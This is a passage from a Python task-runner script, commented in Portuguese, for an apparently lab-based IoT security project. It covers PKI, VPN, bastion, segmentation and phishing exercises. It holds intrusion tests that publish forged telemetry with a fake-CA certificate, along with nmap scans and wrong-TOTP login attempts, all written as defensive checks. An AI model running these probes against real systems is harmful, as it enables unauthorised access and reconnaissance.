#!/usr/bin/env python3
"""
Uso:  python tasks.py <comando> [alvo]

Comandos:
  check                 Confere pré-requisitos (Docker, Compose, memória, .env)
  init                  Cria o arquivo .env com segredos aleatórios
  sysctl                Ajusta vm.max_map_count=262144 na VM do Docker (opcional)
  pull                  Baixa as imagens e o modelo do LLM
  up [hub|edges|all]    Sobe o ambiente (padrão: all)
  down [hub|edges|all]  Derruba o ambiente (padrão: all)
  status                Lista os containers do projeto
  logs <container>      Mostra os logs de um container
  ntp                   Mostra a sincronização de relógio e salva a evidência
  data                  Gera os dados sintéticos (Faker pt_BR)
  mqtt [espaço|all]     Mostra mensagens MQTT dos sensores e salva a evidência
  cenario <espaço> <tipo>  Injeta um cenário no simulador:
                        falha_refrigeracao | pico_consumo | bomba_travada |
                        vazamento | chuva_forte | normal
  pki                   Cria a CA e emite os certificados (broker, dispositivos, monitor)
  certs [dispositivo]   Mostra o registro da CA e um certificado
  intruso [espaço]      Testa conexões indevidas contra o broker (mTLS e ACL)
  revogar <dispositivo> Revoga o certificado e publica a CRL
  rotacionar <disp.>    Emite um certificado novo e revoga o anterior
  wg                    Gera chaves e configurações WireGuard (hub + 5 espaços)
  link <esp> <fibra|4g|tudo> <down|up>   Derruba ou religa links de um espaço
  vpn                   Evidência do túnel e da segmentação pela VPN
  agente [espaço]       Status do agente de borda e eventos no hub
  teste-local [esp] [min]  Queda total de links + cenário de falha (padrão 3 min)
  failover [espaço]     Derruba a fibra, mede o failover para 4g e o retorno
  limpar-telemetria     Apaga as filas dos 5 agentes e a tabela telemetria do hub
  acesso                Gera as chaves SSH do bastion e do administrador e o segredo TOTP
  totp                  Mostra o código TOTP atual e o link para cadastrar no app autenticador
  bastion [teste|shell] Testa o acesso administrativo (VPN + chave + TOTP) ou abre uma sessão
  segmentacao           Testa a matriz de segmentação entre as zonas (nmap)
  varredura             Varredura externa dos IPs públicos do hub e das bordas (nmap)
  firewall              Recarrega as regras nftables do hub e das bordas sem reiniciar containers
  painel                Sobe o painel (vulnerável e corrigido), o WAF e carrega o banco do painel
  sqli                  B14: explora o painel vulnerável (extração via SQLi + alteração sem RBAC)
  reteste               B15: repete o ataque contra o painel corrigido (sem WAF)
  waf                   B16: repete o ataque atravessando o WAF (ModSecurity + CRS)
  rbac                  B17: matriz de MFA e perfis de acesso no painel corrigido
  dns                   B18: DNS do domínio fictício (SPF/DKIM/DMARC) + teste de e-mail forjado
  phishing              B19: campanha simulada no Gophish contra contas fictícias + métricas
  siem                  B21: coleta centralizada de logs das 6 fontes num SIEM (PostgreSQL)
  deteccao              B22: gera gatilhos e roda as 4 regras de detecção (RT-13) com MTTD
  soar                  B23: respostas automatizadas de baixo risco + aprovação humana (MFA)
  incidente             B24: reproduz a cadeia do INC-VA-0712 com linha do tempo
  forense               B25: coleta forense (SHA-256, custódia, timeline, ATT&CK) -> dados do laudo
  anomalia              B26: detecção de anomalias na telemetria (Isolation Forest) + métricas
  llm [preparar|testar] B27: assistente de IA local (Ollama) com guardrails + testes de injeção
  caos [min]            B30: teste de caos (WAN derrubada nos 5 espaços, padrão 45 min) + reconciliação
  metricas              B29: métricas RT-22 (disponibilidade, MTTD/MTTR, autonomia, CPU/mem/banda/energia)
  ripd                  B31: pseudonimização HMAC dos registros de acesso (RT-19)
  ota                   B34: atualização OTA assinada com Ed25519 + verificação
  wcag                  B33: auditoria WCAG 2.1 AA do painel (axe-core + Chromium)
  ponte                Executa pedidos de comandos deste script deixados em docs/ponte/ (Ctrl+C encerra)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import os
import json
import re
import secrets
import struct
import threading
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent
INFRA = ROOT / "infra"
ENV_FILE = ROOT / ".env"
ENV_EXAMPLE = ROOT / ".env.example"
BASTION_OUT = INFRA / "bastion" / "out"
NMAP = "instrumentisto/nmap:latest"
PONTE = ROOT / "docs" / "ponte"
PONTE_PERMITIDOS = {
    "check", "status", "logs", "up", "down", "pull", "sysctl", "ntp", "data", "mqtt", "cenario",
    "pki", "certs", "intruso", "revogar", "rotacionar", "wg", "link", "vpn", "agente", "teste-local",
    "failover", "acesso", "totp", "bastion", "segmentacao", "varredura", "firewall",
    "painel", "sqli", "reteste", "waf", "rbac", "dns", "phishing",
    "siem", "deteccao", "soar", "incidente", "forense", "anomalia", "llm",
    "metricas", "caos", "ota", "ripd", "wcag",
}

SITES = ["ubs", "escola", "centro", "horta", "abrigo"]

IMAGES = [
    "postgres:16-alpine",
    "eclipse-mosquitto:2.0",
    "python:3.12-slim",
    "alpine:3.20",
    "debian:bookworm-slim",
    "owasp/modsecurity-crs:nginx-alpine",
    "gophish/gophish:latest",
    "axllent/mailpit:latest",
    "coredns/coredns:1.11.3",
    "instrumentisto/nmap:latest",
    "ollama/ollama:latest",
]
LLM_MODEL = "llama3.2:3b"


def run(cmd: list[str], check: bool = True, capture: bool = False,
        _input: str | None = None) -> subprocess.CompletedProcess:
    print(f"\n$ {' '.join(cmd)}")
    return subprocess.run(cmd, check=check, text=True, capture_output=capture,
                          encoding="utf-8", errors="replace", input=_input)


def ok(msg: str) -> None:
    print(f"  [OK]      {msg}")


def warn(msg: str) -> None:
    print(f"  [ATENÇÃO] {msg}")


def fail(msg: str) -> None:
    print(f"  [FALHA]   {msg}")


def compose_hub(*args: str) -> list[str]:
    return [
        "docker", "compose",
        "-p", "vila-hub",
        "--env-file", str(ENV_FILE),
        "-f", str(INFRA / "compose.hub.yml"),
        *args,
    ]


def compose_edge(site: str, *args: str) -> list[str]:
    return [
        "docker", "compose",
        "-p", f"vila-edge-{site}",
        "--env-file", str(ENV_FILE),
        "--env-file", str(INFRA / "sites" / f"{site}.env"),
        "-f", str(INFRA / "compose.edge.yml"),
        *args,
    ]


def require_env() -> None:
    if not ENV_FILE.exists():
        print("Arquivo .env não encontrado. Rode primeiro:  python tasks.py init")
        sys.exit(1)


def cmd_check() -> None:
    print("Conferindo pré-requisitos...")
    all_good = True

    if shutil.which("docker"):
        ok("Docker encontrado")
    else:
        fail("Docker não encontrado no PATH")
        sys.exit(1)

    r = run(["docker", "compose", "version", "--short"], check=False, capture=True)
    if r.returncode == 0:
        ok(f"Docker Compose {r.stdout.strip()}")
    else:
        fail("Docker Compose v2 não encontrado")
        all_good = False

    r = run(["docker", "info", "--format", "{{.MemTotal}}"], check=False, capture=True)
    if r.returncode == 0:
        gb = int(r.stdout.strip()) / 1024**3
        if gb >= 14:
            ok(f"Memória disponível para o Docker: {gb:.1f} GB")
        else:
            warn(f"Docker tem {gb:.1f} GB. Recomendado: 16 GB; com menos, rode llm e caos com o resto parado")
    else:
        fail("Docker não está rodando")
        sys.exit(1)

    if ENV_FILE.exists():
        ok(".env presente")
    else:
        warn(".env ausente. Rode: python tasks.py init")
        all_good = False

    print("\nTudo pronto." if all_good else "\nResolva os itens acima antes de subir o ambiente.")


def cmd_init() -> None:
    if ENV_FILE.exists():
        print(".env já existe; nada foi alterado.")
        return
    lines = []
    for line in ENV_EXAMPLE.read_text(encoding="utf-8").splitlines():
        if "CHANGE_ME" in line:
            line = line.replace("CHANGE_ME", secrets.token_urlsafe(24))
        lines.append(line)
    ENV_FILE.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(".env criado com segredos aleatórios.")


def cmd_sysctl() -> None:
    run(["docker", "run", "--rm", "--privileged", "alpine:3.20",
         "sysctl", "-w", "vm.max_map_count=262144"])


def cmd_pull() -> None:
    falhas = []
    for img in IMAGES:
        if run(["docker", "pull", img], check=False).returncode != 0:
            falhas.append(img)

    print(f"\nBaixando o modelo do LLM ({LLM_MODEL})...")
    run(["docker", "volume", "create", "vila_ollama"], check=False)
    run(["docker", "rm", "-f", "vila-ollama-pull"], check=False, capture=True)
    run(["docker", "run", "-d", "--name", "vila-ollama-pull",
         "-v", "vila_ollama:/root/.ollama", "ollama/ollama:latest"], check=False)
    if run(["docker", "exec", "vila-ollama-pull", "ollama", "pull", LLM_MODEL], check=False).returncode != 0:
        falhas.append(f"modelo {LLM_MODEL}")
    run(["docker", "rm", "-f", "vila-ollama-pull"], check=False, capture=True)

    if falhas:
        print("\nNão foi possível baixar:")
        for f in falhas:
            print(f"  - {f}")
    else:
        print("\nTodas as imagens e o modelo foram baixados.")


def cmd_up(target: str) -> None:
    require_env()
    garantir_segredos_painel()
    if target in ("edges", "all") and not (ROOT / "pki" / "out" / "ca-chain.crt").exists():
        print("Certificados não encontrados. Rode primeiro:  python tasks.py pki")
        sys.exit(1)
    if not (INFRA / "wireguard" / "out" / "admin" / "wg0.conf").exists():
        print("Configuração da VPN não encontrada ou sem o acesso do administrador. Rode primeiro:  python tasks.py wg")
        sys.exit(1)
    if target in ("hub", "all") and not (BASTION_OUT / "totp.secret").exists():
        print("Credenciais do bastion não encontradas. Rode primeiro:  python tasks.py acesso")
        sys.exit(1)
    if target in ("hub", "all"):
        run(compose_hub("up", "-d", "--build"))
    if target in ("edges", "all"):
        for site in SITES:
            run(compose_edge(site, "up", "-d", "--build"))
    time.sleep(8)
    cmd_status()
    r = run(["docker", "ps", "--filter", "label=projeto=vila-aurora", "--filter", "status=restarting",
             "--format", "{{.Names}}"], check=False, capture=True)
    instaveis = r.stdout.split()
    if instaveis:
        print("\nATENÇÃO: containers reiniciando em loop: " + ", ".join(instaveis))
        print(f"Veja o motivo com:  python tasks.py logs {instaveis[0]}")


def cmd_down(target: str) -> None:
    require_env()
    if target in ("edges", "all"):
        for site in SITES:
            run(compose_edge(site, "down"), check=False)
    if target in ("hub", "all"):
        run(compose_hub("down"), check=False)


def cmd_status() -> None:
    run(["docker", "ps", "--filter", "label=projeto=vila-aurora",
         "--format", "table {{.Names}}\t{{.Status}}\t{{.Networks}}"])


def cmd_logs(container: str) -> None:
    run(["docker", "logs", "--tail", "100", container], check=False)


def cmd_ntp() -> None:
    containers = ["hub-ntp"] + [f"{s}-ntp" for s in SITES]
    blocks = [f"Coleta: {datetime.now().astimezone().isoformat(timespec='seconds')}"]
    for c in containers:
        for sub in (["tracking"], ["sources", "-v"]):
            r = run(["docker", "exec", c, "chronyc", *sub], check=False, capture=True)
            blocks.append(f"### {c} :: chronyc {' '.join(sub)}\n{r.stdout}{r.stderr}")
            print(blocks[-1])
    out = ROOT / "docs" / "evidencias" / "B02_ntp.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text("\n".join(blocks), encoding="utf-8")
    print(f"\nEvidência salva em {out.relative_to(ROOT)}")


def cmd_data() -> None:
    synth = ROOT / "data" / "synthetic"
    r = run([
        "docker", "run", "--rm",
        "-e", "PIP_DISABLE_PIP_VERSION_CHECK=1",
        "--mount", f"type=bind,source={synth},target=/work",
        "-w", "/work",
        "python:3.12-slim",
        "sh", "-c",
        "pip install -q --root-user-action=ignore 'faker>=30' && python generate.py /work/output",
    ], check=False, capture=True)
    if r.returncode != 0:
        print(r.stdout, r.stderr)
        sys.exit(1)
    resumo = ""
    for _ in range(20):
        resumo = (synth / "output" / "_resumo.txt").read_text(encoding="utf-8").strip()
        if resumo:
            break
        time.sleep(0.5)
    print(resumo)
    blocks = [f"Coleta: {datetime.now().astimezone().isoformat(timespec='seconds')}", resumo]
    for csv_file in sorted((synth / "output").glob("*.csv")):
        linhas = csv_file.read_text(encoding="utf-8").splitlines()
        blocks.append(f"### {csv_file.name} (primeiras linhas)\n" + "\n".join(linhas[:4]))
    out = ROOT / "docs" / "evidencias" / "B03_dados.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text("\n\n".join(blocks), encoding="utf-8")
    print("\n\n".join(blocks[2:]))
    print(f"\nEvidência salva em {out.relative_to(ROOT)}")


MONITOR_TLS = ["-p", "8883", "--cafile", "/monitor/ca-chain.crt",
               "--cert", "/monitor/monitor.crt", "--key", "/monitor/monitor.key"]


def salvar_evidencia(nome: str, blocos: list[str]) -> None:
    out = ROOT / "docs" / "evidencias" / nome
    out.parent.mkdir(parents=True, exist_ok=True)
    cab = f"Coleta: {datetime.now().astimezone().isoformat(timespec='seconds')}"
    out.write_text("\n\n".join([cab, *blocos]), encoding="utf-8")
    print(f"\nEvidência salva em {out.relative_to(ROOT)}")


def site_do_dispositivo(device_id: str) -> str | None:
    prefixo = device_id.split("-")[0]
    return prefixo if prefixo in SITES else None


def pki_run(*args: str, capture: bool = False) -> subprocess.CompletedProcess:
    if run(["docker", "image", "inspect", "vila/pki:1"], check=False, capture=True).returncode != 0:
        run(["docker", "build", "-q", "-t", "vila/pki:1", str(ROOT / "pki")])
    return run(["docker", "run", "--rm",
                "--mount", f"type=bind,source={ROOT},target=/repo",
                "-e", "REPO=/repo", "vila/pki:1", "sh", "/repo/pki/pki.sh", *args],
               check=False, capture=capture)


def reiniciar(containers: list[str]) -> None:
    run(["docker", "restart", *containers], check=False, capture=True)


def logs_recentes(container: str, desde: str = "60s", filtro: str | None = None) -> str:
    r = run(["docker", "logs", "--since", desde, container], check=False, capture=True)
    linhas = (r.stdout + r.stderr).splitlines()
    if filtro:
        linhas = [l for l in linhas if filtro in l]
    return "\n".join(linhas[-40:])


def cmd_pki() -> None:
    r = pki_run("setup", capture=True)
    print(r.stdout, r.stderr)
    st = pki_run("status", capture=True)
    print(st.stdout)
    salvar_evidencia("B05_pki_setup.txt", [r.stdout, st.stdout])


def cmd_certs(device_id: str) -> None:
    alvo = "ubs-camarafria-01" if device_id == "all" else device_id
    st = pki_run("status", capture=True)
    sh = pki_run("show", alvo, capture=True)
    print(st.stdout, sh.stdout, sh.stderr)
    salvar_evidencia("B05_certs.txt", [f"### Registro da CA\n{st.stdout}", f"### Certificado {alvo}\n{sh.stdout}{sh.stderr}"])


def cmd_mqtt(alvo: str) -> None:
    sites = SITES if alvo == "all" else [alvo]
    blocos = []
    for site in sites:
        r = run(["docker", "exec", f"{site}-broker", "mosquitto_sub", "-h", "localhost", *MONITOR_TLS,
                 "-t", "vila/#", "-v", "-C", "12", "-W", "30"], check=False, capture=True)
        blocos.append(f"### {site}-broker :: vila/# (identidade: monitor)\n{r.stdout}{r.stderr}")
        print(blocos[-1])
    salvar_evidencia(f"B04_mqtt_{alvo}.txt", blocos)


def cmd_cenario(site: str, tipo: str) -> None:
    payload = '{"tipo": null}' if tipo == "normal" else f'{{"tipo": "{tipo}"}}'
    run(["docker", "exec", f"{site}-broker", "mosquitto_pub", "-h", "localhost", *MONITOR_TLS,
         "-t", f"vila/{site}/sim/cenario", "-q", "1", "-m", payload])


def cmd_intruso(site: str) -> None:
    site = "ubs" if site == "all" else site
    r = pki_run("intruso", site, capture=True)
    alvo = r.stdout.strip().splitlines()[-1]
    outro = next(d for d in json.loads((ROOT / "devices" / "inventory.json").read_text(encoding="utf-8"))[site]
                 if d["id"] != alvo)["id"]
    base = ["docker", "run", "--rm", "--network", f"vila_field_{site}",
            "--mount", f"type=bind,source={ROOT / 'pki' / 'out'},target=/pki,readonly",
            "eclipse-mosquitto:2.0"]
    falso = '{"temperatura_c": 4.0, "forjado": true}'
    topico = f"vila/{site}/{alvo}/telemetria"
    testes = [
        ("1. Porta 1883 sem criptografia", "recusar",
         ["mosquitto_pub", "-h", "broker", "-p", "1883", "-t", topico, "-m", falso]),
        ("2. TLS sem certificado de cliente", "recusar",
         ["mosquitto_pub", "-h", "broker", "-p", "8883", "--cafile", "/pki/ca-chain.crt",
          "-t", topico, "-m", falso]),
        (f"3. Certificado FORJADO com o nome '{alvo}' (CA falsa)", "recusar",
         ["mosquitto_pub", "-h", "broker", "-p", "8883", "--cafile", "/pki/ca-chain.crt",
          "--cert", f"/pki/intruso/{alvo}.crt", "--key", f"/pki/intruso/{alvo}.key",
          "-t", topico, "-m", falso]),
        (f"4. Certificado válido de '{outro}' publicando no tópico de '{alvo}' (ACL)", "negar publicação (RC 135)",
         ["mosquitto_pub", "-h", "broker", "-p", "8883", "--cafile", "/pki/ca-chain.crt",
          "--cert", f"/pki/sites/{site}/devices/{outro}.crt", "--key", f"/pki/sites/{site}/devices/{outro}.key",
          "-i", f"{outro}-teste", "-V", "mqttv5", "-q", "1", "-d", "-t", topico, "-m", falso]),
        ("5. Monitor com certificado válido (controle positivo)", "aceitar",
         ["mosquitto_sub", "-h", "broker", "-p", "8883", "--cafile", "/pki/ca-chain.crt",
          "--cert", "/pki/monitor/monitor.crt", "--key", "/pki/monitor/monitor.key",
          "-t", f"vila/{site}/#", "-v", "-C", "1", "-W", "15"]),
    ]
    blocos = [f"Alvo: broker do espaço '{site}' (rede local vila_field_{site})"]
    for nome, esperado, cmd in testes:
        t = run(base + cmd, check=False, capture=True)
        saida = (t.stdout + t.stderr).strip() or "(sem saída)"
        blocos.append(f"### {nome}\nEsperado: {esperado} | código de saída: {t.returncode}\n{saida}")
        print(blocos[-1])
    blocos.append("### Log do broker\n" + logs_recentes(f"{site}-broker", "90s"))
    salvar_evidencia(f"B06_mtls_{site}.txt", blocos)


def cmd_revogar(device_id: str) -> None:
    r = pki_run("revoke", device_id, capture=True)
    print(r.stdout, r.stderr)
    if r.returncode != 0:
        sys.exit(1)
    print("Reiniciando os brokers para carregar a nova CRL...")
    reiniciar([f"{s}-broker" for s in SITES])
    time.sleep(20)
    site = site_do_dispositivo(device_id)
    blocos = [f"### Revogação\n{r.stdout}"]
    if site:
        blocos.append(f"### Log do {site}-broker (últimos 60 s)\n" + logs_recentes(f"{site}-broker"))
        blocos.append(f"### Log do simulador ({device_id})\n" + logs_recentes(f"{site}-sensores", filtro=device_id))
    blocos.append("### Registro da CA\n" + pki_run("status", capture=True).stdout)
    for b in blocos[1:]:
        print(b)
    salvar_evidencia(f"B07_revogacao_{device_id}.txt", blocos)


def cmd_rotacionar(device_id: str) -> None:
    r = pki_run("rotate", device_id, capture=True)
    print(r.stdout, r.stderr)
    if r.returncode != 0:
        sys.exit(1)
    site = site_do_dispositivo(device_id)
    reiniciar([f"{s}-broker" for s in SITES] + ([f"{site}-sensores"] if site else []))
    time.sleep(20)
    blocos = [f"### Rotação\n{r.stdout}"]
    if site:
        blocos.append(f"### Log do simulador ({device_id})\n" + logs_recentes(f"{site}-sensores", filtro=device_id))
    blocos.append("### Registro da CA\n" + pki_run("status", capture=True).stdout)
    for b in blocos[1:]:
        print(b)
    salvar_evidencia(f"B07_rotacao_{device_id}.txt", blocos)


CENARIO_PADRAO = {"ubs": "falha_refrigeracao", "escola": "vazamento", "abrigo": "chuva_forte",
                  "horta": "pico_consumo", "centro": "pico_consumo"}
REDE_LINK = {"fibra": "vila_wan", "4g": "vila_lte"}


def psql(sql: str) -> str:
    r = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "vila", "-c", sql],
            check=False, capture=True)
    return (r.stdout + r.stderr).strip()


def status_agente(site: str) -> str:
    r = run(["docker", "exec", f"{site}-agent", "cat", "/data/status.json"], check=False, capture=True)
    return (r.stdout + r.stderr).strip()


def link(site: str, qual: str, acao: str) -> None:
    redes = list(REDE_LINK.values()) if qual == "tudo" else [REDE_LINK[qual]]
    for rede in redes:
        verbo = "disconnect" if acao == "down" else "connect"
        run(["docker", "network", verbo, rede, f"{site}-vpn"], check=False, capture=True)
    print(f"Link {qual} do espaço {site}: {'DERRUBADO' if acao == 'down' else 'restabelecido'}")


def cmd_wg() -> None:
    run(["docker", "build", "-q", "-t", "vila/vpn:1", str(INFRA / "wireguard")])
    r = run(["docker", "run", "--rm", "--mount", f"type=bind,source={ROOT},target=/repo",
             "-e", "REPO=/repo", "vila/vpn:1", "sh", "/usr/local/bin/gen.sh"], check=False, capture=True)
    print(r.stdout, r.stderr)


def cmd_link(site: str, qual: str, acao: str) -> None:
    link(site, qual, acao)


def cmd_vpn() -> None:
    blocos = []
    for c in ["hub-vpn", "ubs-vpn", "escola-vpn"]:
        r = run(["docker", "exec", c, "wg", "show"], check=False, capture=True)
        blocos.append(f"### {c} :: wg show\n{r.stdout}{r.stderr}")
    testes = [
        ("UBS -> hub pelo túnel (permitido)", ["docker", "exec", "ubs-vpn", "ping", "-c", "3", "-W", "2", "10.99.0.1"]),
        ("UBS -> Escola pelo túnel (bloqueado: túnel só leva ao hub)", ["docker", "exec", "ubs-vpn", "ping", "-c", "2", "-W", "2", "10.99.0.12"]),
        ("Serviços escutando no hub (ingestão só no IP do túnel)", ["docker", "exec", "hub-vpn", "ss", "-ltnu"]),
        ("Internet do laboratório -> porta 8443 do hub (deve falhar)",
         ["docker", "run", "--rm", "--network", "vila_wan", "alpine:3.20",
          "wget", "-q", "-T", "3", "-O-", "--no-check-certificate", "https://10.250.1.10:8443/ingest"]),
    ]
    for nome, cmd in testes:
        r = run(cmd, check=False, capture=True)
        blocos.append(f"### {nome}\ncódigo de saída: {r.returncode}\n{(r.stdout + r.stderr).strip()}")
    blocos.append("### Log do hub-vpn\n" + logs_recentes("hub-vpn", "30m"))
    for b in blocos:
        print(b)
    salvar_evidencia("B10_vpn.txt", blocos)


def cmd_agente(site: str) -> None:
    site = "ubs" if site == "all" else site
    blocos = [
        f"### Status do agente {site}\n" + status_agente(site),
        f"### Log do agente {site}\n" + logs_recentes(f"{site}-agent", "30m"),
        "### Eventos recebidos no hub por espaço\n" + psql(
            "SELECT site, count(*) AS eventos, max(recebido_em) AS ultimo FROM telemetria GROUP BY site ORDER BY site"),
    ]
    for b in blocos:
        print(b)
    salvar_evidencia(f"B08_agente_{site}.txt", blocos)


def lacunas_sql(site: str, desde: str) -> str:
    return (f"SELECT device_id, boot, min(seq) AS primeiro, max(seq) AS ultimo, count(*) AS recebidos, "
            f"max(seq) - min(seq) + 1 - count(*) AS perdidos FROM telemetria "
            f"WHERE site = '{site}' AND ts >= '{desde}' GROUP BY device_id, boot ORDER BY device_id, boot")


def totp(segredo: str, instante: float | None = None) -> str:
    chave = base64.b32decode(segredo.upper() + "=" * (-len(segredo) % 8))
    contador = int((time.time() if instante is None else instante) // 30)
    h = hmac.new(chave, struct.pack(">Q", contador), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    return f"{(struct.unpack('>I', h[o:o + 4])[0] & 0x7FFFFFFF) % 1_000_000:06d}"


def segredo_totp() -> str:
    return (BASTION_OUT / "totp.secret").read_text(encoding="utf-8").strip()


def uri_totp(segredo: str) -> str:
    return (f"otpauth://totp/Vila%20Aurora:admin?secret={segredo}"
            "&issuer=Vila%20Aurora&algorithm=SHA1&digits=6&period=30")


def cmd_acesso() -> None:
    BASTION_OUT.mkdir(parents=True, exist_ok=True)
    run(["docker", "build", "-q", "-t", "vila/bastion:1", str(INFRA / "bastion")])
    script = (
        "set -e; cd /out; "
        "[ -f ssh_host_ed25519_key ] || ssh-keygen -q -t ed25519 -N '' -C hub-bastion -f ssh_host_ed25519_key; "
        "[ -f admin_ed25519 ] || ssh-keygen -q -t ed25519 -N '' -C admin@vila-aurora -f admin_ed25519; "
        "echo \"10.30.3.10 $(cut -d' ' -f1,2 ssh_host_ed25519_key.pub)\" > known_hosts; "
        "echo; echo 'Impressão digital do bastion:'; ssh-keygen -lf ssh_host_ed25519_key.pub; "
        "echo 'Chave do administrador:'; ssh-keygen -lf admin_ed25519.pub"
    )
    r = run(["docker", "run", "--rm", "--entrypoint", "sh", "--mount",
             f"type=bind,source={BASTION_OUT},target=/out", "vila/bastion:1", "-c", script],
            check=False, capture=True)
    print(r.stdout, r.stderr)
    arq = BASTION_OUT / "totp.secret"
    if not arq.exists():
        arq.write_text(base64.b32encode(secrets.token_bytes(20)).decode() + "\n", encoding="utf-8")
        print("Segredo TOTP gerado.")
    else:
        print("Segredo TOTP existente mantido.")
    print(f"\nPara usar um app autenticador gratuito (Google Authenticator, Aegis, Microsoft Authenticator),\n"
          f"cadastre manualmente o segredo {segredo_totp()} ou abra o link:\n{uri_totp(segredo_totp())}")
    print("\nArquivos em infra/bastion/out/ (fora do versionamento).")


def cmd_totp() -> None:
    segredo = segredo_totp()
    print(f"Código TOTP atual: {totp(segredo)}  (válido por mais {30 - int(time.time()) % 30} s)")
    print(f"Link para o app autenticador: {uri_totp(segredo)}")


def ssh_admin(codigo: str, *args: str) -> subprocess.CompletedProcess:
    return run(["docker", "exec", "-e", f"TOTP={codigo}", "-e", "SSH_ASKPASS=/usr/local/bin/codigo",
                "-e", "SSH_ASKPASS_REQUIRE=force", "admin-ws", "ssh", *args], check=False, capture=True)


def nmap_cmd(origem: str, alvos: list[str], portas: str, udp: bool = False) -> list[str]:
    args = ["-Pn", "-n", "-T4", "-sU" if udp else "-sT", "--max-retries", "1", "--min-rate", "1000",
            "--host-timeout", "90s", "-p", portas, "-oG", "-", *alvos]
    if origem in ("iot", "adminvpn", "bastion"):
        cont = {"iot": "ubs-vpn", "adminvpn": "admin-ws", "bastion": "hub-bastion"}[origem]
        return ["docker", "run", "--rm", "--network", f"container:{cont}", NMAP, *args]
    if origem in ("svc", "ops"):
        n = {"svc": "1", "ops": "2"}[origem]
        rotas = (f"ip route add 10.30.0.0/16 via 10.30.{n}.254 && "
                 f"ip route add 10.99.0.0/24 via 10.30.{n}.254 && ")
        return ["docker", "run", "--rm", "--network", f"vila_{origem}", "--ip", f"10.30.{n}.200",
                "--cap-add", "NET_ADMIN", "--entrypoint", "sh", NMAP, "-c", rotas + "nmap " + " ".join(args)]
    return ["docker", "run", "--rm", "--network", origem, NMAP, *args]


def portas_abertas(saida: str) -> dict[str, set[str]]:
    abertas: dict[str, set[str]] = {}
    for linha in saida.splitlines():
        if not linha.startswith("Host:") or "Ports:" not in linha:
            continue
        host = linha.split()[1]
        for item in linha.split("Ports:")[1].split("Ignored State")[0].split(","):
            campos = item.strip().split("/")
            if len(campos) > 2 and campos[1] == "open":
                abertas.setdefault(host, set()).add(f"{campos[0]}/{campos[2]}")
    return abertas


def negado(r: subprocess.CompletedProcess) -> bool:
    return r.returncode != 0 and "Permission denied" in r.stdout + r.stderr


def cmd_bastion(modo: str) -> None:
    if modo == "shell":
        print("Sessão administrativa: o bastion vai pedir o 'Verification code'.")
        print("Use o app autenticador ou, em outro terminal:  python tasks.py totp\n")
        subprocess.run(["docker", "exec", "-it", "admin-ws", "ssh", "bastion"])
        return
    segredo = segredo_totp()
    espera = 30 - time.time() % 30 + 1
    print(f"Aguardando {int(espera)} s pelo próximo código TOTP, para o teste começar com um código novo...")
    time.sleep(espera)
    valido = totp(segredo)
    janela = {totp(segredo, time.time() + d) for d in (-30, 0, 30)}
    errado = next(f"{(int(valido) + k * 111111) % 1_000_000:06d}" for k in range(1, 9)
                  if f"{(int(valido) + k * 111111) % 1_000_000:06d}" not in janela)
    blocos = [f"Início: {datetime.now().astimezone().isoformat(timespec='seconds')} | "
              f"estação admin 10.99.0.100 (VPN) -> bastion 10.30.3.10 (chave ed25519 + TOTP)"]

    def registrar(nome: str, esperado: str, r: subprocess.CompletedProcess, passou: bool) -> None:
        saida = (r.stdout + r.stderr).strip() or "(sem saída)"
        blocos.append(f"### {nome}\nEsperado: {esperado} | código de saída: {r.returncode} | "
                      f"resultado: {'OK' if passou else 'FALHOU'}\n{saida}")
        print(blocos[-1])

    r = run(nmap_cmd("vila_wan", ["10.30.3.10", "10.250.1.10"], "22"), check=False, capture=True)
    registrar("1. Internet do laboratório -> SSH do bastion e do hub, sem VPN", "nenhuma porta aberta",
              r, r.returncode == 0 and not portas_abertas(r.stdout))
    r = ssh_admin(errado, "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
                  "bastion", "true")
    registrar("2. Login só com senha", "recusar (senha desabilitada)", r, negado(r))
    r = run(["docker", "exec", "admin-ws", "sh", "-c",
             "rm -f /tmp/k /tmp/k.pub; ssh-keygen -q -t ed25519 -N '' -f /tmp/k && "
             "ssh -F /dev/null -i /tmp/k -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=yes "
             "-o UserKnownHostsFile=/root/.ssh/known_hosts -o ConnectTimeout=5 admin@10.30.3.10 true"],
            check=False, capture=True)
    registrar("3. Chave SSH desconhecida", "recusar na etapa da chave", r, negado(r))
    r = ssh_admin(errado, "bastion", "true")
    registrar(f"4. Chave correta + código TOTP errado ({errado})", "recusar na etapa do TOTP", r, negado(r))
    r = ssh_admin(valido, "bastion",
                  'echo "sessão: $(whoami)@$(hostname) | origem: ${SSH_CLIENT%% *}"; '
                  "nc -zv -w3 10.30.1.20 5432; nc -zv -w3 10.99.0.11 1883; true")
    registrar(f"5. Chave correta + código TOTP válido ({valido})",
              "aceitar; do bastion o banco responde e a borda não", r,
              r.returncode == 0 and "succeeded" in r.stdout + r.stderr)
    r = ssh_admin(valido, "bastion", "true")
    registrar(f"6. Reutilização do mesmo código ({valido})", "recusar (código de uso único)", r, negado(r))
    blocos.append("### Log do bastion\n" + logs_recentes("hub-bastion", "3m"))
    print(blocos[-1])
    salvar_evidencia("B11_bastion_totp.txt", blocos)


MATRIZ = [
    ("Internet (lab)", "Hub: SSH, banco, ingestão", "vila_wan", "10.250.1.10", "22,5432,8443", set()),
    ("Internet (lab)", "Admin: bastion", "vila_wan", "10.30.3.10", "22", set()),
    ("IoT (borda UBS)", "Hub: ingestão", "iot", "10.99.0.1", "22,5432,8443", {"8443/tcp"}),
    ("IoT (borda UBS)", "Serviços: banco", "iot", "10.30.1.20", "5432", set()),
    ("IoT (borda UBS)", "Admin: bastion", "iot", "10.30.3.10", "22", set()),
    ("Admin remoto (VPN)", "Admin: bastion", "adminvpn", "10.30.3.10", "22", {"22/tcp"}),
    ("Admin remoto (VPN)", "Serviços: banco", "adminvpn", "10.30.1.20", "5432", set()),
    ("Admin remoto (VPN)", "Hub: ingestão", "adminvpn", "10.99.0.1", "8443", set()),
    ("Admin (bastion)", "Serviços: banco", "bastion", "10.30.1.20", "22,5432", {"5432/tcp"}),
